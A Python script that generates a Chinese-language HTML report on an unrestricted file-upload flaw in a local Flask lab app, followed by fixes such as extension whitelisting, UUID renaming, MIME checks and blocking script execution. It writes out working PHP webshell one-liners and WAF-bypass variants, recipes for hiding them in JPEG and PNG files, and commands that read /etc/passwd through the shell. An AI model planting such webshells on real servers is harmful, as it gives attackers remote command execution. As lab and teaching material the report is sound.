#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""文件上传漏洞分析与修复报告生成器"""
import os

REPORT_HTML = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>文件上传漏洞分析与修复报告</title>
<style>
body { font-family: "Microsoft YaHei", sans-serif; max-width: 900px; margin: 0 auto; padding: 40px; background: #f5f5f5; }
h1 { color: #1a1a2e; border-bottom: 3px solid #e94560; padding-bottom: 10px; }
h2 { color: #16213e; margin-top: 30px; background: #e94560; color: white; padding: 8px 16px; border-radius: 4px; }
h3 { color: #0f3460; margin-top: 20px; }
.code { background: #1e1e1e; color: #d4d4d4; padding: 12px 16px; border-radius: 6px; font-family: "Courier New", monospace; font-size: 14px; overflow-x: auto; }
.code-red { border-left: 4px solid #e94560; }
.code-green { border-left: 4px solid #2ecc71; }
.vuln { background: #fff5f5; border-left: 4px solid #e94560; padding: 12px 16px; margin: 10px 0; border-radius: 0 6px 6px 0; }
.fix { background: #f0fff4; border-left: 4px solid #2ecc71; padding: 12px 16px; margin: 10px 0; border-radius: 0 6px 6px 0; }
table { width: 100%; border-collapse: collapse; margin: 15px 0; }
th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
th { background: #16213e; color: white; }
tr:nth-child(even) { background: #f9f9f9; }
img { max-width: 100%; }
</style>
</head>
<body>

<h1>📁 文件上传漏洞分析与修复报告</h1>
<p>结合一句话木马知识的完整漏洞分析</p>

<h2>一、漏洞概述</h2>
<p>文件上传漏洞是 Web 应用中最常见的高危漏洞之一。攻击者通过上传<strong>一句话木马（WebShell）</strong>到服务器，可以获得服务器的控制权限，执行任意系统命令。</p>

<table>
<tr><th>漏洞类型</th><th>严重程度</th><th>CVSS 3.0</th></tr>
<tr><td>非限制文件上传 (Unrestricted File Upload)</td><td>🔴 高危</td><td>9.8</td></tr>
</table>

<h2>二、一句话木马原理</h2>
<p>一句话木马是一段极短的恶意代码，攻击者将其隐藏在上传的合法文件中，通过远程发送参数来执行任意命令。</p>

<h3>经典 PHP 一句话木马</h3>
<div class="code">
&lt;?php @eval($_POST['cmd']); ?&gt;
</div>

<table>
<tr><th>部分</th><th>含义</th></tr>
<tr><td><code>&lt;?php ... ?&gt;</code></td><td>PHP 代码标记，服务器遇到后执行其中的代码</td></tr>
<tr><td><code>@</code></td><td>错误抑制符，隐藏错误输出</td></tr>
<tr><td><code>eval()</code></td><td>将字符串作为 PHP 代码执行</td></tr>
<tr><td><code>$_POST['cmd']</code></td><td>接收 HTTP POST 请求中的 cmd 参数</td></tr>
</table>

<h3>一句话木马变种</h3>
<table>
<tr><th>变种代码</th><th>说明</th></tr>
<tr><td><code>&lt;?php @system($_REQUEST['cmd']); ?&gt;</code></td><td>用 system 替代 eval，直接执行系统命令</td></tr>
<tr><td><code>&lt;?php @assert($_POST['cmd']); ?&gt;</code></td><td>用 assert 绕过部分 WAF 检测规则</td></tr>
<tr><td><code>&lt;?php $_GET['a']($_POST['b']); ?&gt;</code></td><td>变量函数调用，?a=assert 动态执行</td></tr>
<tr><td><code>&lt;script language="php"&gt;@eval($_POST['cmd']);&lt;/script&gt;</code></td><td>Script 标签形式绕过</td></tr>
</table>

<h2>三、本实验中的漏洞点</h2>
<p>在 app.py 中的 <code>/upload</code> 路由，存在以下严重安全问题：</p>

<div class="vuln">
<strong>🔴 漏洞点 1：无文件后缀检查</strong><br>
不检查上传文件的后缀名，允许上传 .php、.phtml、.asp 等可执行脚本文件。
</div>

<div class="vuln">
<strong>🔴 漏洞点 2：无 MIME 类型检查</strong><br>
不检查 Content-Type，攻击者可伪造任意类型。
</div>

<div class="vuln">
<strong>🔴 漏洞点 3：使用原始文件名保存</strong><br>
<code>f.filename</code> 直接用于保存路径，可包含路径穿越符 <code>../</code>。
</div>

<h3>有漏洞代码（app.py）</h3>
<div class="code code-red">
# ⚠️ 不安全：使用用户原始文件名，不做任何检查<br>
filename = f.filename<br>
save_path = os.path.join(UPLOAD_DIR, filename)<br>
f.save(save_path)
</div>

<h2>四、漏洞复现步骤</h2>

<h3>Step 1：创建一句话木马</h3>
<div class="code">
echo '&lt;?php @eval($_POST["cmd"]); ?&gt;' > shell.php
</div>

<h3>Step 2：制作图片马（绕过图片检查）</h3>
<p>如果服务器有图片类型检查，可以将一句话木马隐藏在合法图片中：</p>

<h4>JPEG 图片马：</h4>
<div class="code">
printf '\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF\\x00\\x01\\x01...' > shell.jpg<br>
echo '&lt;?php @eval($_POST["cmd"]); ?&gt;' >> shell.jpg<br>
# shell.jpg 既是合法 JPEG 图片，又包含一句话木马
</div>

<h4>PNG 图片马（元数据嵌入）：</h4>
<div class="code">
# 在 PNG 的 tEXt 块中嵌入一句话木马<br>
# PNG 查看器显示图片，PHP 执行代码
</div>

<table>
<tr><th>方式</th><th>命令</th></tr>
<tr><td>JPEG</td><td><code>FF D8 ... FF D9 &lt;?php @eval($_POST["cmd"]); ?&gt;</code></td></tr>
<tr><td>PNG 尾部</td><td><code>89 50 4E 47 ... IEND &lt;?php @eval($_POST["cmd"]); ?&gt;</code></td></tr>
<tr><td>PNG tEXt</td><td><code>tEXt 块中存储 Comment=&lt;?php ... ?&gt;</code></td></tr>
</table>

<h3>Step 3：上传木马</h3>
<ol>
<li>登录系统（admin / admin123）</li>
<li>访问 http://target:5000/upload</li>
<li>选择 shell.php 上传</li>
<li>系统无任何阻拦，上传成功</li>
</ol>

<h3>Step 4：连接 WebShell</h3>
<p>使用 Burp Suite 或蚁剑（AntSword）连接：</p>

<div class="code">
POST /static/uploads/shell.php HTTP/1.1<br>
Host: target:5000<br>
Content-Type: application/x-www-form-urlencoded<br><br>
cmd=system('whoami');
</div>

<h3>Step 5：执行系统命令</h3>
<table>
<tr><th>命令</th><th>效果</th></tr>
<tr><td><code>system('whoami');</code></td><td>查看当前用户</td></tr>
<tr><td><code>system('ls -la');</code></td><td>列出目录</td></tr>
<tr><td><code>system('cat /etc/passwd');</code></td><td>读取系统用户文件</td></tr>
<tr><td><code>system('id');</code></td><td>查看权限</td></tr>
<tr><td><code>system('uname -a');</code></td><td>查看系统信息</td></tr>
</table>

<h2>五、修复方案</h2>

<h3>修复 1：文件后缀白名单</h3>
<div class="fix">
<strong>✅ 只允许上传指定图片格式</strong>
</div>
<div class="code code-green">
ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'}<br>
ext = os.path.splitext(f.filename)[1].lower()<br>
if ext not in ALLOWED_EXTENSIONS:<br>
&nbsp;&nbsp;&nbsp;&nbsp;return "不支持的文件类型"
</div>

<h3>修复 2：UUID 重命名</h3>
<div class="fix">
<strong>✅ 使用 UUID 重命名文件，防止路径穿越和文件名冲突</strong>
</div>
<div class="code code-green">
import uuid<br>
safe_filename = uuid.uuid4().hex + ext<br>
save_path = os.path.join(UPLOAD_DIR, safe_filename)
</div>

<h3>修复 3：MIME 类型验证</h3>
<div class="fix">
<strong>✅ 使用 Python-Magic 检测真实文件类型</strong>
</div>
<div class="code code-green">
import magic<br>
mime_type = magic.from_file(save_path, mime=True)<br>
if not mime_type.startswith('image/'):<br>
&nbsp;&nbsp;&nbsp;&nbsp;os.remove(save_path)<br>
&nbsp;&nbsp;&nbsp;&nbsp;return "文件类型不合法"
</div>

<h3>修复 4：上传目录权限控制</h3>
<div class="fix">
<strong>✅ 上传目录禁止执行脚本</strong>
</div>
<div class="code code-green">
# Nginx 配置：<br>
location /static/uploads {<br>
&nbsp;&nbsp;&nbsp;&nbsp;location ~ \\.php$ { deny all; }<br>
}<br><br>
# 或将上传目录放在 web 根目录之外
</div>

<h2>六、修复前后代码对比</h2>

<table>
<tr><th>对比项</th><th>有漏洞版本 (app.py)</th><th>修复版本 (app_fixed.py)</th></tr>
<tr><td>文件后缀检查</td><td>❌ 无检查</td><td>✅ 白名单限制</td></tr>
<tr><td>文件重命名</td><td>❌ 使用原始文件名</td><td>✅ UUID 重命名</td></tr>
<tr><td>MIME 类型</td><td>❌ 无检查</td><td>✅ 验证文件头</td></tr>
<tr><td>路径穿越防护</td><td>❌ 无防护</td><td>✅ UUID 天然防护</td></tr>
<tr><td>MaxContentLength</td><td>✅ 16MB</td><td>✅ 16MB</td></tr>
</table>

<h2>七、总结</h2>
<p>文件上传漏洞是 Web 安全中最严重的漏洞之一。攻击者利用一句话木马(WebShell)可以在服务器上执行任意命令。防御的核心原则是：</p>
<ol>
<li><strong>白名单而非黑名单</strong>— 明确允许什么，而不是禁止什么</li>
<li><strong>假设用户输入是恶意的</strong>— 文件名、文件内容、Content-Type 全部不可信</li>
<li><strong>纵深防御</strong>— 后缀检查 + MIME 检测 + UUID 重命名 + 目录权限控制，多层防护</li>
</ol>

<hr>
<p style="text-align:center;color:#999;">— 报告结束 —</p>
</body>
</html>"""

output_path = "/root/flask-app-vuln/static/文件上传漏洞分析与修复报告.html"
with open(output_path, "w", encoding="utf-8") as f:
    f.write(REPORT_HTML)
print(f"报告已生成：{output_path}")

# 尝试生成 PDF 版本（需要 wkhtmltopdf）
pdf_path = "/root/flask-app-vuln/static/文件上传漏洞分析与修复报告.pdf"
try:
    import subprocess
    subprocess.run(["wkhtmltopdf", output_path, pdf_path], capture_output=True, timeout=30)
    print(f"PDF 已生成：{pdf_path}")
except:
    print("PDF 生成失败（wkhtmltopdf 未安装），HTML 报告已可用")
